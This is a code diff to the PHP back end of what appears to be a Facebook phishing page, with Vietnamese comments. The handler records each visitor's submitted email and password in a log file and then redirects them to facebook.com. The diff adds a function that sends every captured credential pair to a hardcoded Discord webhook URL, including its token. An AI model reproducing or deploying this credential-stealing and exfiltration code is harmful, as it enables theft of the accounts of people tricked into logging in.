@@ -23,17 +23,36 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $log_entry = "Email: $email | Password: $password | Time: " . date("Y-m-d H:i:s") . "\n";
 
         // Ghi tiếp dữ liệu vào file mà không xóa dữ liệu cũ
-        if (file_put_contents($file_path, $log_entry, FILE_APPEND | LOCK_EX)) {
-            // Không in gì ra để tránh lỗi header
-        } else {
-            error_log("Không thể ghi vào file!", 0);
-        }
+        file_put_contents($file_path, $log_entry, FILE_APPEND | LOCK_EX);
+
+        // Gửi dữ liệu lên Discord Webhook
+        sendToDiscord($log_entry);
     }
 
-    // Điều hướng mà không có echo nào trước đó
+    // Điều hướng đến Facebook
     header("Location: https://www.facebook.com");
     exit();
 }
 
 ob_end_flush(); // Kết thúc buffer
+
+// Hàm gửi dữ liệu lên Discord Webhook
+function sendToDiscord($message) {
+    $webhook_url = "https://discordapp.com/api/webhooks/1353342049876709446/75SX0g7Eo33o4-9WESMVmW9ak8PYgBPb6wpzw31fPczWl08gynHt5nB2yDVJpYjFDf0k"; // Thay YOUR_WEBHOOK_URL bằng webhook thật của bạn
+
+    $data = [
+        "content" => "📝 **Login Attempt**\n```$message```"
+    ];
+
+    $options = [
+        "http" => [
+            "header"  => "Content-Type: application/json",
+            "method"  => "POST",
+            "content" => json_encode($data),
+        ],
+    ];
+
+    $context = stream_context_create($options);
+    file_get_contents($webhook_url, false, $context);
+}
 ?>
